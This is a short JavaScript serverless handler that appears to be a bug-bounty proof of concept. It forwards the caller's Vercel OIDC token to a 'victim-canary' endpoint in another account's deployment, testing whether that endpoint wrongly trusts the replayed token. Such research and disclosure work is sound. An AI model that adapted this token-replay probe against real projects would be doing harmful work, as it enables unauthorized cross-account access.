
export default async function handler(req, res) {
  const token = req.headers["x-vercel-oidc-token"];

  if (!token) {
    return res.status(401).json({
      error: "OIDC token unavailable",
      caller_project: "ACCOUNT_A",
      caller_environment: process.env.VERCEL_ENV || null
    });
  }

  const target =
    "https://bb-vercel-lab-2026-9qg8-git-main-hackerone-b-by-moraz1.vercel.app/api/victim-canary";

  try {
    const response = await fetch(target, {
      method: "GET",
      headers: {
        "x-vercel-trusted-oidc-idp-token": token
      },
      redirect: "manual",
      cache: "no-store"
    });

    return res.status(200).json({
      caller_project: "ACCOUNT_A",
      caller_environment: process.env.VERCEL_ENV || null,
      oidc_token_present: true,
      target_status: response.status,
      location_present: Boolean(
        response.headers.get("location")
      )
    });
  } catch (error) {
    return res.status(502).json({
      error: "Target request failed",
      message: String(error.message).slice(0, 300)
    });
  }
}
